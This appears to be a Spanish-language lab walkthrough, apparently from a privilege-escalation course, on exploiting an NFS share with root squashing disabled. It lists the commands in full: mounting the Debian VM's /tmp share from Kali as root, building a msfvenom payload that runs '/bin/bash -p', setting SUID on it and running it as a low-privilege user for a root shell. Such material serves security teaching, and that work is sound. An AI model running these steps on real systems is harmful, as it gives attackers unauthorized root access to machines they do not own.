# NFS

Los archivos creados a través de NFS heredan el ID del usuario remoto. Si el usuario es root y se ha habilitado la supresión de root, el ID se establecerá en el usuario "nobody".

Verifica la configuración del recurso compartido NFS en la VM de Debian:

```bash
cat /etc/exports
```

Observa que el recurso compartido /tmp tiene la supresión de root deshabilitada.

En tu máquina Kali, cambia al usuario root si aún no estás ejecutando como root:

```bash
sudo su
```

Usando el usuario root de Kali, crea un punto de montaje en tu máquina Kali y monta el recurso compartido /tmp (actualiza la IP según corresponda):

```bash
mkdir /tmp/nfs
mount -o rw,vers=3 10.10.10.10:/tmp /tmp/nfs
```

Todavía usando el usuario root de Kali, genera un payload usando msfvenom y guárdalo en el recurso compartido montado (este payload simplemente llama a /bin/bash):

```bash
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
```

Todavía usando el usuario root de Kali, haz el archivo ejecutable y establece el permiso SUID:

```bash
chmod +xs /tmp/nfs/shell.elf
```

De regreso en la VM de Debian, como el usuario de bajo privilegio, ejecuta el archivo para obtener una shell de root:

```bash
/tmp/shell.elf
```

<mark style="color:red;">**Recursos**</mark>

{% embed url="https://juggernaut-sec.com/nfs-no_root_squash/" %}
